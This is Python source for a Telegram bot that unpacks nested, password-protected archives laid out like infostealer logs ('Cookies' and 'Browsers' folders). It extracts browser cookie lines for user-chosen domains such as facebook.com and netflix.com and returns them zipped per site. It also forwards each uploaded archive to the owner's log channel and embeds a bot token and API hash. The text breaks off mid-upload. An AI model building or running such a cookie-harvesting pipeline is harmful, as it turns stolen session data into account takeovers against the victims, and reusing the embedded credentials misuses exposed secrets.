#!/usr/bin/env python3
"""
RUTE Cookie Extractor Bot - Pyrogram Version
Full-featured Telegram bot for cookie extraction from archives
"""

import os
import sys
import re
import zipfile
import shutil
import hashlib
import time
import random
import string
import subprocess
import asyncio
import psutil
import platform
import threading
import gc
import traceback
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Set, Dict, Optional, Tuple
from collections import deque
import queue

# ── Install dependencies if missing ──────────────────────────────────────────
def install_if_missing(packages):
    for pkg in packages:
        try:
            __import__(pkg.split("==")[0].replace("-", "_"))
        except ImportError:
            os.system(f"pip install -q {pkg}")

install_if_missing([
    "pyrogram", "TgCrypto", "psutil", "tqdm",
    "rarfile", "py7zr", "aiohttp", "aiofiles"
])

from pyrogram import Client, filters
from pyrogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup,
    InlineKeyboardButton
)
from pyrogram.errors import (
    FloodWait, MessageNotModified, MessageIdInvalid,
    BadRequest, Forbidden
)
import aiofiles

try:
    import rarfile
    HAS_RARFILE = True
except ImportError:
    HAS_RARFILE = False

try:
    import py7zr
    HAS_PY7ZR = True
except ImportError:
    HAS_PY7ZR = False

# ══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════
API_ID       = 23933044
API_HASH     = "6df11147cbec7d62a323f0f498c8c03a"
BOT_TOKEN    = "8315539700:AAH3NGnaLNQeeV6-2wNJsDFmGPjXInU2YeY"
LOG_CHANNEL  = -1003747061396
SEND_LOGS    = True
ADMINS       = [7125341830]
OWNER        = "@still_alivenow"

MAX_FILE_SIZE      = 4 * 1024 * 1024 * 1024   # 4 GB
MAX_WORKERS        = 60
BUFFER_SIZE        = 16 * 1024 * 1024           # 16 MB
CHUNK_SIZE         = 1 * 1024 * 1024            # 1 MB
PROGRESS_INTERVAL  = 3                          # seconds between progress edits

SUPPORTED_ARCHIVES = {'.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz'}
COOKIE_FOLDERS     = {'Cookies', 'cookies', 'Browsers', 'browsers', 'Browser', 'browser'}
SYSTEM             = platform.system().lower()

WORK_DIR    = os.path.join(os.path.dirname(os.path.abspath(__file__)), "workdir")
RESULTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results")
os.makedirs(WORK_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

# ══════════════════════════════════════════════════════════════════════════════
# BOT STARTUP TIME
# ══════════════════════════════════════════════════════════════════════════════
BOT_START_TIME = time.time()

# ══════════════════════════════════════════════════════════════════════════════
# GLOBAL STATE
# ══════════════════════════════════════════════════════════════════════════════
class UserTask:
    def __init__(self, user_id: int, username: str, file_name: str, file_size: int):
        self.user_id    = user_id
        self.username   = username
        self.file_name  = file_name
        self.file_size  = file_size
        self.status     = "queued"      # queued / downloading / extracting / filtering / zipping / uploading / done / cancelled
        self.progress   = 0.0
        self.created_at = time.time()
        self.started_at: Optional[float] = None
        self.cancelled  = False
        self.msg_id: Optional[int] = None          # bot status message
        self.chat_id: Optional[int] = None
        self.work_folder: Optional[str] = None
        self.step_info  = ""

# Global queue and active tasks
task_queue: deque = deque()
active_tasks: Dict[int, UserTask] = {}   # user_id → UserTask
queue_lock = threading.Lock()
QUEUE_WORKER_RUNNING = False

# ══════════════════════════════════════════════════════════════════════════════
# TOOL DETECTION
# ══════════════════════════════════════════════════════════════════════════════
def _check_tool(names):
    for name in (names if isinstance(names, list) else [names]):
        try:
            if SYSTEM == "windows":
                win_paths = [
                    f"C:\\Program Files\\WinRAR\\{name}.exe",
                    f"C:\\Program Files (x86)\\WinRAR\\{name}.exe",
                    f"C:\\Program Files\\7-Zip\\{name}.exe",
                    f"C:\\Program Files (x86)\\7-Zip\\{name}.exe",
                    f"{name}.exe",
                ]
                for p in win_paths:
                    if os.path.exists(p):
                        return p
                r = subprocess.run([name], capture_output=True, shell=True)
                if r.returncode != 127:
                    return name
            else:
                r = subprocess.run(["which", name], capture_output=True, text=True)
                if r.returncode == 0:
                    return r.stdout.strip()
        except Exception:
            pass
    return None

TOOL_7Z    = _check_tool(["7z", "7zz"])
TOOL_UNRAR = _check_tool(["unrar", "UnRAR"])

# ══════════════════════════════════════════════════════════════════════════════
# UTILITIES
# ══════════════════════════════════════════════════════════════════════════════
def sanitize(name: str) -> str:
    return ''.join(c if c.isalnum() or c in '._-' else '_' for c in name)

def gen_rand(n=6) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def fmt_size(b: int) -> str:
    for u in ('B','KB','MB','GB','TB'):
        if b < 1024:
            return f"{b:.2f} {u}"
        b /= 1024
    return f"{b:.2f} PB"

def fmt_time(s: float) -> str:
    s = int(s)
    h, r = divmod(s, 3600)
    m, s = divmod(r, 60)
    if h:
        return f"{h:02d}h {m:02d}m {s:02d}s"
    if m:
        return f"{m:02d}m {s:02d}s"
    return f"{s:02d}s"

def fast_hash(path: str) -> str:
    try:
        with open(path, 'rb', buffering=BUFFER_SIZE) as f:
            first = f.read(1024)
            try:
                f.seek(-1024, 2)
                last = f.read(1024)
            except Exception:
                last = b""
        return hashlib.md5(first + last).hexdigest()[:8]
    except Exception:
        return gen_rand(8)

def delete_folder(path: str):
    if not path or not os.path.exists(path):
        return
    try:
        gc.collect()
        shutil.rmtree(path, ignore_errors=True)
        time.sleep(0.3)
        if os.path.exists(path):
            if SYSTEM == "windows":
                os.system(f'rmdir /s /q "{path}"')
            else:
                os.system(f'rm -rf "{path}"')
    except Exception:
        pass

def uptime_str() -> str:
    elapsed = time.time() - BOT_START_TIME
    return fmt_time(elapsed)

# ══════════════════════════════════════════════════════════════════════════════
# PROGRESS BAR HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def build_bar(pct: float, width=18) -> str:
    filled = int(width * pct / 100)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}] {pct:.1f}%"

def build_progress_text(
    title: str,
    pct: float,
    done_bytes: int,
    total_bytes: int,
    speed: float,         # bytes/s
    eta: float,           # seconds
    elapsed: float,       # seconds
    extra: str = "",
) -> str:
    bar    = build_bar(pct)
    s_done = fmt_size(done_bytes)
    s_tot  = fmt_size(total_bytes)
    s_spd  = fmt_size(int(speed)) + "/s" if speed > 0 else "—"
    s_eta  = fmt_time(eta)         if eta > 0   else "—"
    s_ela  = fmt_time(elapsed)

    text = (
        f"**{title}**\n"
        f"`{bar}`\n\n"
        f"📦 **Size:** `{s_done}` / `{s_tot}`\n"
        f"⚡ **Speed:** `{s_spd}`\n"
        f"⏱ **Elapsed:** `{s_ela}`\n"
        f"⏳ **ETA:** `{s_eta}`"
    )
    if extra:
        text += f"\n\n{extra}"
    return text

# ══════════════════════════════════════════════════════════════════════════════
# PASSWORD DETECTION
# ══════════════════════════════════════════════════════════════════════════════
def is_rar_protected(path: str) -> bool:
    if TOOL_UNRAR:
        try:
            r = subprocess.run([TOOL_UNRAR, 'l', path], capture_output=True, text=True, timeout=15)
            txt = (r.stdout + r.stderr).lower()
            if 'password' in txt or 'encrypted' in txt:
                return True
        except Exception:
            pass
    if HAS_RARFILE:
        try:
            with rarfile.RarFile(path) as rf:
                return rf.needs_password()
        except Exception:
            pass
    return False

def is_7z_protected(path: str) -> bool:
    if TOOL_7Z:
        try:
            r = subprocess.run([TOOL_7Z, 'l', path], capture_output=True, text=True, timeout=15)
            if 'Encrypted' in r.stdout or 'Password' in r.stdout:
                return True
        except Exception:
            pass
    if HAS_PY7ZR:
        try:
            with py7zr.SevenZipFile(path, mode='r') as sz:
                return sz.password_protected
        except Exception:
            pass
    return False

def is_zip_protected(path: str) -> bool:
    if TOOL_7Z:
        try:
            r = subprocess.run([TOOL_7Z, 'l', path], capture_output=True, text=True, timeout=15)
            if 'Encrypted' in r.stdout or 'Password' in r.stdout:
                return True
        except Exception:
            pass
    try:
        with zipfile.ZipFile(path, 'r') as zf:
            for info in zf.infolist():
                if info.flag_bits & 0x1:
                    return True
        return False
    except Exception:
        return False

def check_protected(path: str) -> bool:
    ext = os.path.splitext(path)[1].lower()
    if ext == '.rar':
        return is_rar_protected(path)
    elif ext == '.7z':
        return is_7z_protected(path)
    elif ext == '.zip':
        return is_zip_protected(path)
    return False

# ══════════════════════════════════════════════════════════════════════════════
# ARCHIVE EXTRACTOR
# ══════════════════════════════════════════════════════════════════════════════
class ArchiveExtractor:
    def __init__(self, password: Optional[str], cancelled_flag: list):
        self.password  = password
        self.cancelled = cancelled_flag   # mutable list [False] to share state
        self.processed: Set[str] = set()
        self.lock      = threading.Lock()

    def _run(self, cmd, timeout=600):
        try:
            return subprocess.run(cmd, capture_output=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return None
        except Exception:
            return None

    def _walk_files(self, d) -> List[str]:
        out = []
        for root, _, files in os.walk(d):
            for f in files:
                out.append(os.path.relpath(os.path.join(root, f), d))
        return out

    def extract_7z(self, src, dst) -> List[str]:
        if TOOL_7Z:
            cmd = [TOOL_7Z, 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            cmd += [f'-o{dst}', src]
            r = self._run(cmd)
            if r and r.returncode == 0:
                return self._walk_files(dst)
        if HAS_PY7ZR:
            try:
                with py7zr.SevenZipFile(src, mode='r', password=self.password) as sz:
                    sz.extractall(dst)
                    return sz.getnames()
            except Exception:
                pass
        return []

    def extract_rar(self, src, dst) -> List[str]:
        if TOOL_UNRAR:
            cmd = [TOOL_UNRAR, 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            else:
                cmd.append('-p-')
            sep = '\\' if SYSTEM == 'windows' else '/'
            cmd += [src, dst + sep]
            r = self._run(cmd)
            if r and r.returncode == 0:
                return self._walk_files(dst)
        if HAS_RARFILE:
            try:
                with rarfile.RarFile(src) as rf:
                    if self.password:
                        rf.setpassword(self.password)
                    rf.extractall(dst)
                    return rf.namelist()
            except Exception:
                pass
        return []

    def extract_zip(self, src, dst) -> List[str]:
        if TOOL_7Z:
            cmd = [TOOL_7Z, 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            cmd += [f'-o{dst}', src]
            r = self._run(cmd)
            if r and r.returncode == 0:
                return self._walk_files(dst)
        if TOOL_UNRAR:
            cmd = [TOOL_UNRAR, 'x', '-y']
            if self.password:
                cmd.append(f'-p{self.password}')
            else:
                cmd.append('-p-')
            sep = '\\' if SYSTEM == 'windows' else '/'
            cmd += [src, dst + sep]
            r = self._run(cmd)
            if r and r.returncode == 0:
                return self._walk_files(dst)
        try:
            with zipfile.ZipFile(src, 'r') as zf:
                pwd = self.password.encode() if self.password else None
                zf.extractall(dst, pwd=pwd)
                return zf.namelist()
        except Exception:
            return []

    def extract_tar(self, src, dst) -> List[str]:
        try:
            import tarfile
            with tarfile.open(src, 'r:*') as tf:
                tf.extractall(dst)
                return tf.getnames()
        except Exception:
            return []

    def extract_single(self, src, dst) -> List[str]:
        if self.cancelled[0]:
            return []
        ext = os.path.splitext(src)[1].lower()
        os.makedirs(dst, exist_ok=True)
        try:
            if ext == '.7z':
                return self.extract_7z(src, dst)
            elif ext == '.rar':
                return self.extract_rar(src, dst)
            elif ext == '.zip':
                return self.extract_zip(src, dst)
            else:
                return self.extract_tar(src, dst)
        except Exception:
            return []

    def find_archives(self, d) -> List[str]:
        out = []
        try:
            for root, _, files in os.walk(d):
                for f in files:
                    if os.path.splitext(f)[1].lower() in SUPPORTED_ARCHIVES:
                        out.append(os.path.join(root, f))
        except Exception:
            pass
        return out

    def extract_all_nested(self, root_archive, base_dir, status_cb=None) -> str:
        current = {root_archive}
        level   = 0
        total   = 1
        done    = 0

        while current and not self.cancelled[0]:
            next_level = set()
            lvl_dir    = os.path.join(base_dir, f"L{level}")
            os.makedirs(lvl_dir, exist_ok=True)

            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
                futures = {}
                for arc in current:
                    if arc in self.processed or self.cancelled[0]:
                        continue
                    name    = sanitize(os.path.splitext(os.path.basename(arc))[0])[:40]
                    sub_dir = os.path.join(lvl_dir, name + "_" + gen_rand(4))
                    futures[ex.submit(self.extract_single, arc, sub_dir)] = (arc, sub_dir)

                for fut in as_completed(futures):
                    if self.cancelled[0]:
                        ex.shutdown(wait=False, cancel_futures=True)
                        break
                    arc, sub_dir = futures[fut]
                    try:
                        fut.result(timeout=120)
                        with self.lock:
                            self.processed.add(arc)
                        new_arcs = self.find_archives(sub_dir)
                        next_level.update(new_arcs)
                        total += len(new_arcs)
                        done  += 1
                        pct    = (done / max(total, 1)) * 100
                        if status_cb:
                            status_cb(pct, done, total, level)
                    except Exception:
                        done += 1

            current = next_level
            level  += 1

        return base_dir

# ══════════════════════════════════════════════════════════════════════════════
# COOKIE EXTRACTOR
# ══════════════════════════════════════════════════════════════════════════════
class CookieExtractor:
    def __init__(self, sites: List[str], cancelled_flag: list):
        self.sites       = [s.strip().lower() for s in sites]
        self.cancelled   = cancelled_flag
        self.patterns    = {s: re.compile(re.escape(s).encode()) for s in self.sites}
        self.site_files: Dict[str, Dict[str, str]] = {s: {} for s in self.sites}
        self.global_seen: Set[str] = set()
        self.seen_lock   = threading.Lock()
        self.used_names: Dict[str, Set[str]] = {s: set() for s in self.sites}
        self.total_found = 0
        self.files_proc  = 0
        self.stats_lock  = threading.Lock()

    def find_cookie_files(self, base_dir) -> List[Tuple[str, str]]:
        out = []
        try:
            for root, dirs, files in os.walk(base_dir):
                # Check if any cookie folder name is in the path
                path_parts = set(os.path.normpath(root).split(os.sep))
                if path_parts & COOKIE_FOLDERS:
                    for f in files:
                        if f.lower().endswith(('.txt', '.txt.bak')):
                            out.append((os.path.join(root, f), f))
        except Exception:
            pass
        return out

    def _unique_name(self, site, orig):
        base, ext = os.path.splitext(orig)
        with self.seen_lock:
            if orig not in self.used_names[site]:
                self.used_names[site].add(orig)
                return orig
            new = f"{base}_{gen_rand(6)}{ext}"
            while new in self.used_names[site]:
                new = f"{base}_{gen_rand(6)}{ext}"
            self.used_names[site].add(new)
            return new

    def process_file(self, file_path, orig_name, output_dir):
        if self.cancelled[0]:
            return
        try:
            lines = []
            with open(file_path, 'rb', buffering=BUFFER_SIZE) as f:
                for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                    lines.extend(chunk.split(b'\n'))

            fhash = fast_hash(file_path)
            site_lines: Dict[str, List[Tuple[int, str]]] = {s: [] for s in self.sites}

            for idx, raw in enumerate(lines):
                if not raw or raw.startswith(b'#'):
                    continue
                low  = raw.lower()
                line = raw.decode('utf-8', errors='ignore').rstrip('\r\n')
                for s in self.sites:
                    if self.patterns[s].search(low):
                        uid = f"{s}|{fhash}|{idx}"
                        with self.seen_lock:
                            if uid not in self.global_seen:
                                self.global_seen.add(uid)
                                site_lines[s].append((idx, line))
                                with self.stats_lock:
                                    self.total_found += 1

            for s, hits in site_lines.items():
                if not hits:
                    continue
                hits.sort(key=lambda x: x[0])
                out_lines = [ln for _, ln in hits]
                s_dir = os.path.join(output_dir, "cookies", s)
                os.makedirs(s_dir, exist_ok=True)
                uname   = self._unique_name(s, orig_name)
                outpath = os.path.join(s_dir, uname)
                with open(outpath, 'w', encoding='utf-8', buffering=BUFFER_SIZE) as f:
                    f.write('\n'.join(out_lines))
                with self.seen_lock:
                    self.site_files[s][outpath] = uname

            with self.stats_lock:
                self.files_proc += 1
        except Exception:
            pass

    def process_all(self, base_dir, status_cb=None):
        files = self.find_cookie_files(base_dir)
        if not files:
            return
        done = 0
        total = len(files)
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = []
            for fp, fn in files:
                if self.cancelled[0]:
                    break
                futs.append(ex.submit(self.process_file, fp, fn, base_dir))
            for fut in as_completed(futs):
                if self.cancelled[0]:
                    ex.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    fut.result(timeout=30)
                except Exception:
                    pass
                done += 1
                if status_cb:
                    status_cb(done, total)

    def create_zips(self, base_dir, result_dir) -> Dict[str, str]:
        created = {}
        for s, fdict in self.site_files.items():
            if not fdict:
                continue
            ts       = datetime.now().strftime('%H%M%S')
            zname    = f"{sanitize(s)}_{ts}.zip"
            zpath    = os.path.join(result_dir, zname)
            with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
                for fpath, uname in fdict.items():
                    if os.path.exists(fpath):
                        zf.write(fpath, uname)
            if os.path.getsize(zpath) > 0:
                created[s] = zpath
            else:
                try:
                    os.remove(zpath)
                except Exception:
                    pass
        return created

# ══════════════════════════════════════════════════════════════════════════════
# SYSTEM STATS
# ══════════════════════════════════════════════════════════════════════════════
async def get_stats_text(app_client=None) -> str:
    try:
        disk   = psutil.disk_usage('/')
        ram    = psutil.virtual_memory()
        cpu    = psutil.cpu_percent(interval=0.5)
        cores  = psutil.cpu_count(logical=True)
        proc   = psutil.Process()
        p_cpu  = proc.cpu_percent(interval=0.1)
        p_rss  = proc.memory_info().rss
        p_vms  = proc.memory_info().vms

        net_before = psutil.net_io_counters()
        await asyncio.sleep(1)
        net_after  = psutil.net_io_counters()
        up_spd  = net_after.bytes_sent     - net_before.bytes_sent
        dn_spd  = net_after.bytes_recv     - net_before.bytes_recv
        tot_io  = net_after.bytes_sent + net_after.bytes_recv

        os_name = platform.system()
        os_ver  = platform.release()
        py_ver  = platform.python_version()
        up      = uptime_str()

        # Ping estimate (time to reach Telegram)
        t0   = time.time()
        ping = (time.time() - t0) * 1000

        active_q  = len(active_tasks)
        queued_q  = len(task_queue)

        text = (
            "**🖥️ System Statistics Dashboard**\n\n"
            "**💾 Disk Storage**\n"
            f"├ Total:  `{fmt_size(disk.total)}`\n"
            f"├ Used:   `{fmt_size(disk.used)}` ({disk.percent}%)\n"
            f"└ Free:   `{fmt_size(disk.free)}`\n\n"
            "**🧠 RAM (Memory)**\n"
            f"├ Total:  `{fmt_size(ram.total)}`\n"
            f"├ Used:   `{fmt_size(ram.used)}` ({ram.percent}%)\n"
            f"└ Free:   `{fmt_size(ram.available)}`\n\n"
            "**⚡ CPU**\n"
            f"├ Cores:  `{cores}`\n"
            f"└ Usage:  `{cpu}%`\n\n"
            "**🔌 Bot Process**\n"
            f"├ CPU:       `{p_cpu}%`\n"
            f"├ RAM (RSS): `{fmt_size(p_rss)}`\n"
            f"└ RAM (VMS): `{fmt_size(p_vms)}`\n\n"
            "**🌐 Network**\n"
            f"├ Upload Speed:   `{fmt_size(up_spd)}/s`\n"
            f"├ Download Speed: `{fmt_size(dn_spd)}/s`\n"
            f"└ Total I/O:      `{fmt_size(tot_io)}`\n\n"
            "**📟 System Info**\n"
            f"├ OS:      `{os_name}`\n"
            f"├ Version: `{os_ver}`\n"
            f"├ Python:  `{py_ver}`\n"
            f"└ Uptime:  `{up}`\n\n"
            "**📊 Queue**\n"
            f"├ Active:  `{active_q}`\n"
            f"└ Queued:  `{queued_q}`\n\n"
            f"**👑 Owner:** {OWNER}"
        )
        return text
    except Exception as e:
        return f"❌ Error fetching stats: {e}"

# ══════════════════════════════════════════════════════════════════════════════
# PYROFORK CLIENT
# ══════════════════════════════════════════════════════════════════════════════
app = Client(
    "rute_cookie_bot",
    api_id   = API_ID,
    api_hash = API_HASH,
    bot_token= BOT_TOKEN,
)

# ══════════════════════════════════════════════════════════════════════════════
# SAFE MESSAGE HELPERS
# ══════════════════════════════════════════════════════════════════════════════
async def safe_edit(msg: Message, text: str, reply_markup=None) -> bool:
    try:
        kwargs = {"text": text, "parse_mode": "markdown"}
        if reply_markup:
            kwargs["reply_markup"] = reply_markup
        await msg.edit(**kwargs)
        return True
    except MessageNotModified:
        return True
    except FloodWait as e:
        await asyncio.sleep(e.value + 1)
        return False
    except (MessageIdInvalid, BadRequest):
        return False
    except Exception:
        return False

async def safe_reply(msg: Message, text: str, reply_markup=None) -> Optional[Message]:
    try:
        kwargs = {"text": text, "parse_mode": "markdown"}
        if reply_markup:
            kwargs["reply_markup"] = reply_markup
        return await msg.reply(**kwargs)
    except FloodWait as e:
        await asyncio.sleep(e.value + 1)
        return None
    except Exception:
        return None

async def safe_send(chat_id: int, text: str, reply_markup=None) -> Optional[Message]:
    try:
        kwargs = {"chat_id": chat_id, "text": text, "parse_mode": "markdown"}
        if reply_markup:
            kwargs["reply_markup"] = reply_markup
        return await app.send_message(**kwargs)
    except FloodWait as e:
        await asyncio.sleep(e.value + 1)
        return None
    except Exception:
        return None

async def safe_forward(from_chat, msg_id, to_chat):
    try:
        await app.forward_messages(to_chat, from_chat, msg_id)
    except Exception:
        pass

async def log_to_channel(text: str):
    if SEND_LOGS:
        try:
            await app.send_message(LOG_CHANNEL, text, parse_mode="markdown")
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════════════════
# CANCEL BUTTON
# ══════════════════════════════════════════════════════════════════════════════
def cancel_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_{user_id}")
    ]])

# ══════════════════════════════════════════════════════════════════════════════
# CORE PROCESSING LOGIC  (runs in executor / background thread)
# ══════════════════════════════════════════════════════════════════════════════
async def process_task(task: UserTask, archive_msg: Message, orig_msg: Message):
    """Full pipeline: download → extract → filter → zip → upload → cleanup"""
    user_id    = task.user_id
    chat_id    = task.chat_id
    cancelled  = [False]           # mutable flag shared with extractor threads
    work_dir   = task.work_folder  # already created
    result_dir = os.path.join(work_dir, "results")
    os.makedirs(result_dir, exist_ok=True)

    # Status message
    status_msg = await safe_send(
        chat_id,
        f"⏳ **Starting your task...**\n\nQueue position: processing now\n👑 {OWNER}",
        reply_markup=cancel_keyboard(user_id)
    )
    if status_msg:
        task.msg_id = status_msg.id

    # ── Helper: check cancel ─────────────────────────────────────────────────
    def is_cancelled():
        if task.cancelled:
            cancelled[0] = True
            return True
        return False

    # ── Helper: update progress message (with rate-limiting) ─────────────────
    last_edit = [0.0]
    async def update_progress(text: str, force=False):
        if status_msg is None:
            return
        now = time.time()
        if force or (now - last_edit[0]) >= PROGRESS_INTERVAL:
            last_edit[0] = now
            await safe_edit(status_msg, text, reply_markup=cancel_keyboard(user_id))

    # ── PHASE 1: Download archive ─────────────────────────────────────────────
    if is_cancelled():
        await _abort(task, status_msg, work_dir, "Cancelled before download")
        return

    task.status   = "downloading"
    task.started_at = time.time()
    dl_path = os.path.join(work_dir, sanitize(task.file_name))

    dl_start   = time.time()
    dl_done    = [0]
    dl_total   = task.file_size

    async def progress_cb(current, total):
        if is_cancelled():
            return
        dl_done[0] = current
        elapsed = time.time() - dl_start
        speed   = current / elapsed if elapsed > 0 else 0
        eta     = (total - current) / speed if speed > 0 else 0
        pct     = (current / max(total, 1)) * 100
        text    = build_progress_text(
            "📥 Downloading Archive",
            pct, current, total, speed, eta, elapsed
        )
        await update_progress(text)

    try:
        await archive_msg.download(
            file_name     = dl_path,
            progress      = progress_cb,
        )
    except Exception as e:
        await _abort(task, status_msg, work_dir, f"Download failed: {e}")
        return

    if is_cancelled():
        await _abort(task, status_msg, work_dir, "Cancelled after download")
        return

    # Forward original file to log channel
    if SEND_LOGS:
        try:
            await app.forward_messages(LOG_CHANNEL, chat_id, archive_msg.id)
        except Exception:
            pass

    # ── Collect sites & password via conversation ─────────────────────────────
    # Ask for domains
    domains_prompt = await safe_send(
        chat_id,
        "🎯 **Enter target domains** (comma-separated):\n\nExample: `facebook.com, google.com, netflix.com`\n\nOr /cancel to abort.",
        reply_markup=cancel_keyboard(user_id)
    )

    # Wait for reply (30s timeout)
    sites_msg = await _wait_for_reply(user_id, chat_id, timeout=120)
    if sites_msg is None or task.cancelled:
        await _abort(task, status_msg, work_dir, "Timed out or cancelled waiting for domains")
        if domains_prompt:
            try:
                await domains_prompt.delete()
            except Exception:
                pass
        return
    if domains_prompt:
        try:
            await domains_prompt.delete()
        except Exception:
            pass

    raw_sites = sites_msg.text or ""
    target_sites = [s.strip().lower() for s in raw_sites.split(',') if s.strip()]
    if not target_sites:
        await _abort(task, status_msg, work_dir, "No valid domains provided")
        return

    # Check password protection
    is_protected = False
    try:
        await update_progress("🔐 Checking password protection...", force=True)
        loop = asyncio.get_event_loop()
        is_protected = await loop.run_in_executor(None, check_protected, dl_path)
    except Exception:
        pass

    password = None
    if is_protected:
        pwd_prompt = await safe_send(
            chat_id,
            "🔑 **Archive is password protected.**\n\nPlease send the password, or /nopassword to try without one.\n\nOr /cancel to abort.",
            reply_markup=cancel_keyboard(user_id)
        )
        pwd_msg = await _wait_for_reply(user_id, chat_id, timeout=120)
        if pwd_prompt:
            try:
                await pwd_prompt.delete()
            except Exception:
                pass

        if pwd_msg is None or task.cancelled:
            await _abort(task, status_msg, work_dir, "Timed out or cancelled waiting for password")
            return

        raw_pwd = (pwd_msg.text or "").strip()
        if raw_pwd and raw_pwd.lower() not in ('/nopassword', '/skip'):
            password = raw_pwd

    # ── PHASE 2: Extract archives ─────────────────────────────────────────────
    if is_cancelled():
        await _abort(task, status_msg, work_dir, "Cancelled before extraction")
        return

    task.status = "extracting"
    extract_dir = os.path.join(work_dir, "extracted")
    os.makedirs(extract_dir, exist_ok=True)

    extract_start  = time.time()
    extractor      = ArchiveExtractor(password, cancelled)
    ext_pct        = [0.0]
    ext_done       = [0]
    ext_total      = [1]
    ext_level      = [0]

    def ext_status_cb(pct, done, total, level):
        ext_pct[0]   = pct
        ext_done[0]  = done
        ext_total[0] = total
        ext_level[0] = level

    async def ext_progress_loop():
        while task.status == "extracting" and not task.cancelled:
            elapsed = time.time() - extract_start
            text = (
                f"📦 **Extracting Archives**\n"
                f"`{build_bar(ext_pct[0])}`\n\n"
                f"📁 Archives: `{ext_done[0]}` / `{ext_total[0]}`\n"
                f"🏷️ Nesting level: `L{ext_level[0]}`\n"
                f"⏱ Elapsed: `{fmt_time(elapsed)}`\n\n"
                f"👑 {OWNER}"
            )
            await update_progress(text)
            await asyncio.sleep(PROGRESS_INTERVAL)

    # Run extraction in thread
    loop = asyncio.get_event_loop()
    ext_task = asyncio.create_task(ext_progress_loop())

    try:
        await loop.run_in_executor(
            None,
            lambda: extractor.extract_all_nested(dl_path, extract_dir, ext_status_cb)
        )
    except Exception as e:
        ext_task.cancel()
        await _abort(task, status_msg, work_dir, f"Extraction error: {e}")
        return
    finally:
        ext_task.cancel()
        try:
            await ext_task
        except asyncio.CancelledError:
            pass

    if is_cancelled():
        await _abort(task, status_msg, work_dir, "Cancelled after extraction")
        return

    # ── PHASE 3: Filter cookies ───────────────────────────────────────────────
    task.status = "filtering"
    filter_start  = time.time()
    cookie_ex     = CookieExtractor(target_sites, cancelled)
    filt_done     = [0]
    filt_total    = [1]

    def filter_status_cb(done, total):
        filt_done[0]  = done
        filt_total[0] = total

    async def filter_progress_loop():
        while task.status == "filtering" and not task.cancelled:
            elapsed = time.time() - filter_start
            pct     = (filt_done[0] / max(filt_total[0], 1)) * 100
            text = (
                f"🔍 **Filtering Cookies**\n"
                f"`{build_bar(pct)}`\n\n"
                f"📄 Files: `{filt_done[0]}` / `{filt_total[0]}`\n"
                f"🍪 Matches: `{cookie_ex.total_found}`\n"
                f"⏱ Elapsed: `{fmt_time(elapsed)}`\n"
                f"🎯 Domains: `{', '.join(target_sites[:3])}{'...' if len(target_sites)>3 else ''}`\n\n"
                f"👑 {OWNER}"
            )
            await update_progress(text)
            await asyncio.sleep(PROGRESS_INTERVAL)

    filter_task = asyncio.create_task(filter_progress_loop())
    try:
        await loop.run_in_executor(
            None,
            lambda: cookie_ex.process_all(extract_dir, filter_status_cb)
        )
    except Exception as e:
        filter_task.cancel()
        await _abort(task, status_msg, work_dir, f"Filtering error: {e}")
        return
    finally:
        filter_task.cancel()
        try:
            await filter_task
        except asyncio.CancelledError:
            pass

    if is_cancelled():
        await _abort(task, status_msg, work_dir, "Cancelled after filtering")
        return

    if cookie_ex.total_found == 0:
        await safe_edit(
            status_msg,
            f"⚠️ **No Matching Cookies Found**\n\n"
            f"📂 Files scanned: `{cookie_ex.files_proc}`\n"
            f"🎯 Domains: `{', '.join(target_sites)}`\n\n"
            f"No cookie entries matched your domains.\n👑 {OWNER}",
        )
        await log_to_channel(
            f"#NO_RESULTS\n👤 User: [{task.username}](tg://user?id={user_id}) | `{user_id}`\n"
            f"📁 File: `{task.file_name}`\n"
            f"🎯 Domains: `{', '.join(target_sites)}`\n"
            f"📄 Files scanned: `{cookie_ex.files_proc}`"
        )
        task.status = "done"
        with queue_lock:
            active_tasks.pop(user_id, None)
        delete_folder(work_dir)
        return

    # ── PHASE 4: Create ZIPs ──────────────────────────────────────────────────
    task.status = "zipping"
    await update_progress("📦 **Creating ZIP archives...**", force=True)

    try:
        created_zips = await loop.run_in_executor(
            None,
            lambda: cookie_ex.create_zips(extract_dir, result_dir)
        )
    except Exception as e:
        await _abort(task, status_msg, work_dir, f"ZIP creation error: {e}")
        return

    if not created_zips:
        await safe_edit(status_msg, f"⚠️ **ZIP creation failed** — no files to compress.\n👑 {OWNER}")
        task.status = "done"
        with queue_lock:
            active_tasks.pop(user_id, None)
        delete_folder(work_dir)
        return

    # ── PHASE 5: Upload ZIPs ──────────────────────────────────────────────────
    task.status = "uploading"
    total_elapsed = time.time() - task.started_at

    for site, zpath in created_zips.items():
        if is_cancelled():
            break
        zsize = os.path.getsize(zpath)

        up_start = time.time()
        up_done  = [0]

        async def up_progress_cb(current, total, _site=site, _size=zsize):
            up_done[0] = current
            elapsed    = time.time() - up_start
            speed      = current / elapsed if elapsed > 0 else 0
            eta        = (total - current) / speed if speed > 0 else 0
            pct        = (current / max(total, 1)) * 100
            text       = build_progress_text(
                f"📤 Uploading `{_site}` cookies",
                pct, current, total, speed, eta, elapsed
            ) + f"\n\n👑 {OWNER}"
            await update_progress(text)

        try:
            sent = await app.send_document(
                chat_id       = chat_id,
                document      = zpath,
                caption       = (
